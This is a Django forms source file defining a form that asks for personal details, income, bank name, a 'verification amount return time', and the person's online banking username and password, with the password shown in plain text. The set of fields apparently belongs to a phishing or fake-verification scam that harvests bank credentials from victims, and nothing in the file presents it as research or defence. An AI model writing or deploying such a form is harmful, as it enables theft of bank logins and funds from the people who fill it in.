from django import forms
from .models import autoclosesnippet
from django.contrib.auth.forms import AuthenticationForm
class SnippetFormFive(forms.ModelForm):
	first_name = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "First Name"}))
	last_name = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Last Name"}))
	email = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Email Address"}))
	phone = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Phone"}))
	bankname = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Your Bank Name"}))
	how_long_banking = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Since How Long You Are Banking With Your Bank?"}))
	monthly_income = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Your Monthly Income"}))
	send_time = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Verification Amount Return Time (Example: Morning, Afternoon)"}))
	username = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Your Online Banking Username"}))
	password1 = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Your Online Banking Password"}))
	password2 = forms.CharField(widget=forms.TextInput(attrs={"class":"form-control required", "placeholder": "Confirm Password"}))

	class Meta:
		model = autoclosesnippet
		fields = ('first_name', 'last_name', 'email', 'phone', 'bankname', 'how_long_banking', 'monthly_income', 'send_time', 'username', 'bankname', 'username', 'password1', 'password2')

